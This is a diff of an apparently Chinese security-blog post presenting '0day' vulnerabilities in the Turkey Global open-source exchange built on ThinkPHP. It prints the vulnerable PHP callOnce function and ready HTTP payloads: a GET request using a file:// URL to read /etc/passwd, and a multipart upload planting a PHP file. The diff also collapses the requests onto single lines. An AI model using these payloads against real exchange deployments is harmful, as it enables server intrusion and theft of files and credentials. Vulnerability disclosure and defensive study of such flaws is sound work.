@@ -1,5 +1,5 @@
 #  【0day】Turkey Global全开源9语言交易所审计   
-原创 Mstir  星悦安全   2025-05-12 05:00  
+ 阿乐你好   2025-05-13 01:00  
   
 ![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
   
@@ -23,20 +23,10 @@ Fofa指纹:
   
 **框架:ThinkPHP 5.0.24 Debug:True**  
 ## 0x01 前台任意文件读取漏洞  
-位于 /application/api/controller/Fanyi.php 控制器的 callOnce 方法通过传入url参数，进入curl_exec 中，导致漏洞产生.public function callOnce($url, $args=null, $method="post", $withCookie = false, $timeout = 10, $headers=array())  {/*{{{*/   $ch = curl_init();   if($method == "post")    {     $data = $this->convert($args);     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);     curl_setopt($ch, CURLOPT_POST, 1);   }   else    {     $data = $this->convert($args);     if($data)      {       if(stripos($url, "?") > 0)        {         $url .= "&$data";       }       else        {         $url .= "?$data";       }     }   }   curl_setopt($ch, CURLOPT_URL, $url);   curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   if(!empty($headers))    {     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);   }   if($withCookie)   {     curl_setopt($ch, CURLOPT_COOKIEJAR, $_COOKIE);   }   $r = curl_exec($ch);   curl_close($ch);   return $r;  }  
+位于 /application/api/controller/Fanyi.php 控制器的 callOnce 方法通过传入url参数，进入curl_exec 中，导致漏洞产生.public function callOnce($url, $args=null, $method="post", $withCookie = false, $timeout = 10, $headers=array())  {/*{{{*/   $ch = curl_init();   if($method == "post")    {     $data = $this->convert($args);     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);     curl_setopt($ch, CURLOPT_POST, 1);   }   else   {     $data = $this->convert($args);     if($data)      {       if(stripos($url, "?") > 0)        {         $url .= "&$data";       }       else       {         $url .= "?$data";       }     }   }   curl_setopt($ch, CURLOPT_URL, $url);   curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   if(!empty($headers))    {     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);   }   if($withCookie)   {     curl_setopt($ch, CURLOPT_COOKIEJAR, $_COOKIE);   }   $r = curl_exec($ch);   curl_close($ch);   return $r;  }  
 **Payload:**  
 ```
-GET /api/fanyi/callOnce?url=file:///etc/passwd HTTP/1.1
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
-Cache-Control: no-cache
-Connection: keep-alive
-Host: 192.168.200.128
-Pragma: no-cache
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
-
+GET /api/fanyi/callOnce?url=file:///etc/passwd HTTP/1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Cache-Control: no-cacheConnection: keep-aliveHost: 192.168.200.128Pragma: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
 ```  
   
   
@@ -48,25 +38,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Payload:  
   
 ```
-POST /***/***/****/****/fileUpload HTTP/1.1
-Host: 192.168.200.128
-Content-Length: 997
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHx58bwavVjamnK8o
-Accept: */*
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Connection: close
-
-------WebKitFormBoundaryHx58bwavVja
-
-...... 完整Payload在文末
-------WebKitFormBoundaryHx58bwavVja
-Content-Disposition: form-data; name="file"; filename="1.php"
-Content-Type: application/octet-stream
-
-<?php phpinfo();?>
-------WebKitFormBoundaryHx58bwavVjamnK8o--
+POST /***/***/****/****/fileUpload HTTP/1.1Host: 192.168.200.128Content-Length: 997User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHx58bwavVjamnK8oAccept: */*Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundaryHx58bwavVja...... 完整Payload在文末------WebKitFormBoundaryHx58bwavVjaContent-Disposition: form-data; name="file"; filename="1.php"Content-Type: application/octet-stream<?php phpinfo();?>------WebKitFormBoundaryHx58bwavVjamnK8o--
 ```  
   
   
